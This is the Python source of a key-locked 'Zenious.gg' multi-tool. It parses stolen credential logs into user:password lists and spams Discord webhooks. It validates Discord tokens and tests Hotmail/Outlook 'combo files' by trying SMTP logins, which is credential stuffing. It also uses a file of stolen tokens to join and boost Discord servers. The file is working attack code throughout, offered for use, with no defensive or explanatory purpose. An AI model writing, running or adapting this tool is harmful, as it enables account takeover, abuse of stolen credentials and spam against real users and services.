import os
import re
import shutil
import time
import itertools
import threading
import requests
import uuid
import platform
import hashlib
import smtplib

# Flag to control the animation loop
animation_running = True

def set_window_title(title):
    if os.name == 'nt':
        os.system(f'title {title}')
    else:
        print(f'\33]0;{title}\a', end='', flush=True)

def print_colored_logo_with_wave_effect():
    global animation_running
    logo = [
        " ________                     __                               ",
        "|        \\                   |  \\                              ",
        " \\$$$$$$$$ ______   _______   \\$$  ______   __    __   _______ ",
        "    /  $$ /      \\ |       \\ |  \\ /      \\ |  \\  |  \\ /       \\",
        "   /  $$  |  $$$$$$\\| $$$$$$$\\| $$| $$$$$$$\\| $$  | $$|  $$$$$$$",
        "  /  $$___| $$    $$| $$  | $$| $$| $$  | $$| $$  | $$ \\$$    \\ ",
        " /  $$    \\\\$$$$$$$\\| $$  | $$| $$| $$__/ $$| $$__/ $$ _\\$$$$$$\\",
        "|  $$     _\\$$     \\| $$  | $$| $$ \\$$    $$ \\$$    $$|       $$",
        " \\$$$$$$$$ \\$$$$$$$ \\$$   \\$$ \\$$  \\$$$$$$   \\$$$$$$  \\$$$$$$$ ",
        "                                                                ",
        "                                                                ",
        "                                                                ",
        "   __                          __                               ",
        "  |  \\                        |  \\                              ",
        " _| $$_     ______    ______  | $$  _______                     ",
        "|   $$ \\   /      \\  /      \\ | $$ /       \\                    ",
        " \\$$$$$$  |  $$$$$$\\|  $$$$$$\\| $$|  $$$$$$$                    ",
        "  | $$ __ | $$  | $$| $$  | $$| $$ \\$$    \\                     ",
        "  | $$|  \\| $$__/ $$| $$__/ $$| $$ _\\$$$$$$\\                    ",
        "   \\$$  $$ \\$$    $$ \\$$    $$| $$|       $$                    ",
        "    \\$$$$   \\$$$$$$   \\$$$$$$  \\$$ \\$$$$$$$                    "
    ]

    colors = ['\033[94m', '\033[95m']
    RESET = '\033[0m'
    terminal_width = shutil.get_terminal_size().columns

    def print_logo_with_colors(colors):
        os.system('cls' if os.name == 'nt' else 'clear')
        for i, line in enumerate(logo):
            color = colors[i % len(colors)]
            print(color + line.center(terminal_width) + RESET)

    color_cycle = itertools.cycle(colors)

    try:
        while animation_running:
            current_colors = [next(color_cycle) for _ in range(len(logo))]
            print_logo_with_colors(current_colors)
            time.sleep(0.05)
    except KeyboardInterrupt:
        pass

def get_hwid():
    system_info = platform.system() + platform.machine() + platform.node() + platform.processor()
    mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    unique_info = system_info + mac_address
    return hashlib.sha256(unique_info.encode()).hexdigest()

def fetch_keys_from_github(url):
    response = requests.get(url)
    if response.status_code == 200:
        return response.text.splitlines()
    else:
        print("Failed to fetch keys from GitHub.")
        return []

def validate_key(url, user_key):
    hwid = get_hwid()
    key_hwid_pairs = fetch_keys_from_github(url)

    for pair in key_hwid_pairs:
        if ':' not in pair:
            continue  # Skip malformed lines
        key, stored_hwid = pair.split(':', 1)  # Ensure only one split
        if key == user_key and stored_hwid == hwid:
            return True
    return False

def process_file(input_file_path, output_folder, search_term):
    os.makedirs(output_folder, exist_ok=True)
    output_file_path = os.path.join(output_folder, "extracted_accounts.txt")

    with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as file:
        lines = file.readlines()

    unique_accounts = set()

    with open(output_file_path, 'w', encoding='utf-8') as output_file:
        for line in lines:
            if search_term in line:
                match = re.search(r'://(?:[^:]+:)([^:]+):([^\s]+)', line)
                if match:
                    user, password = match.groups()
                    account_info = f"{user}:{password}"
                    if account_info not in unique_accounts:
                        output_file.write(account_info + "\n")
                        unique_accounts.add(account_info)

    print(f"Processed lines saved to {output_file_path}")
    time.sleep(0.5)
    os.system("cls")

def spam_webhook(webhook_url, message, count):
    for i in range(count):
        response = requests.post(webhook_url, json={'content': message})
        if response.status_code == 204:
            print(f"Message sent {i+1}/{count}")
        else:
            print(f"Failed to send message {i+1}/{count}")
        time.sleep(0.2)

def check_hotmail_outlook_accounts(input_file_path):
    output_file_path = "active_hotmails.txt"
    with open(input_file_path, 'r', encoding='utf-8', errors='ignore') as file:
        lines = file.readlines()

    valid_accounts = []
    for line in lines:
        line = line.strip()
        if ':' not in line:
            print(f"Skipping invalid line: {line}")
            continue

        email, password = line.split(':', 1)
        try:
            smtp_server = smtplib.SMTP('smtp.office365.com', 587)
            smtp_server.starttls()
            smtp_server.login(email, password)
            smtp_server.quit()
            valid_accounts.append(f"{email}:{password}")
            print(f"Valid: {email}")
        except Exception as e:
            print(f"Invalid: {email} - {e}")

    with open(output_file_path, 'w', encoding='utf-8') as output_file:
        for account in valid_accounts:
            output_file.write(account + "\n")

    print(f"Valid accounts saved to {output_file_path}")
    time.sleep(0.5)
    os.system("cls")

def check_discord_token(token):
    headers = {'Authorization': token}
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if response.status_code == 200:
        user_data = response.json()
        username = user_data['username']
        nitro_info = user_data.get('premium_type', 0)
        if nitro_info == 0:
            nitro_status = "No Nitro"
        elif nitro_info == 1:
            nitro_status = "Nitro Classic"
        elif nitro_info == 2:
            nitro_status = "Nitro"
        else:
            nitro_status = "Unknown Nitro Type"
        return True, username, nitro_status
    else:
        return False, None, None

def boost_nitro_server(token_file_path, server_invite_code):
    with open(token_file_path, 'r', encoding='utf-8', errors='ignore') as file:
        tokens = file.readlines()

    for token in tokens:
        token = token.strip()
        headers = {'Authorization': token}

        # Join the server
        join_response = requests.post(
            f'https://discord.com/api/v9/invites/{server_invite_code}',
            headers=headers,
            json={"type": 1}
        )
        if join_response.status_code == 200:
            print(f"Joined server with token: {token}")
        else:
            print(f"Failed to join server with token: {token}")
            continue

        # Boost the server twice
        for _ in range(2):
            boost_response = requests.post(
                'https://discord.com/api/v9/guilds/premium/subscription-slots',
                headers=headers,
                json={"user_premium_guild_subscription_slot_ids": [""]}
            )
            if boost_response.status_code == 201:
                print(f"Boosted server with token: {token}")
            else:
                print(f"Failed to boost server with token: {token}")
                break

def main():
    global animation_running
    set_window_title("Zenious.gg")
    logo_thread = threading.Thread(target=print_colored_logo_with_wave_effect)
    logo_thread.daemon = True
    logo_thread.start()
    time.sleep(2)
    animation_running = False
    logo_thread.join()
    os.system('cls' if os.name == 'nt' else 'clear')
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'

    while True:
        print(f"{BLUE}Multi-Tool Menu:{RESET}")
        print(f"{PURPLE}1. Process File{RESET}")
        print(f"{BLUE}2. Spam Webhook{RESET}")
        print(f"{PURPLE}3. Validate Discord Token{RESET}")
        print(f"{BLUE}4. Check Hotmail/Outlook Accounts{RESET}")
        print(f"{PURPLE}5. Boost Nitro Server{RESET}")
        print(f"{BLUE}6. Exit{RESET}")

        choice = input(f"{PURPLE}Option : {RESET}")

        if choice == '1':
            input_file_path = 'in.txt'
            output_folder = 'output'
            search_term = input("Enter the search term: ")
            process_file(input_file_path, output_folder, search_term)
        elif choice == '2':
            webhook_url = input("Enter the webhook URL: ")
            message = input("Enter the message to spam: ")
            count = int(input("Enter the number of messages to send: "))
            spam_webhook(webhook_url, message, count)
            time.sleep(0.5)
            os.system("cls")
        elif choice == '3':
            token = input("Enter the Discord token to check: ")
            is_valid, username, nitro_status = check_discord_token(token)
            if is_valid:
                print(f"Token is valid. Username: {username}, Nitro Status: {nitro_status}")
            else:
                print("Token is invalid.")
            time.sleep(2)
            os.system("cls")
        elif choice == '4':
            input_file_path = input("Enter the path to the combo file: ")
            check_hotmail_outlook_accounts(input_file_path)
        elif choice == '5':
            token_file_path = '1m.txt'
            server_invite_code = input("Enter the server invite code: ")
            boost_nitro_server(token_file_path, server_invite_code)
            time.sleep(2)
            os.system("cls")
        elif choice == '6':
            print("Exiting the program.")
            break
        else:
            print("Invalid option. Please try again.")
            time.sleep(0.5)
            os.system("cls")

def check_key_and_run():
    github_url = "https://raw.githubusercontent.com/hxizx/boring/refs/heads/main/keys.txt"
    user_key = input("Enter your key to access the program: ")

    if validate_key(github_url, user_key):
        print("Key validated. Access granted.")
        time.sleep(1)
        main()
    else:
        print("Invalid key or HWID mismatch. Access denied.")

if __name__ == "__main__":
    check_key_and_run()
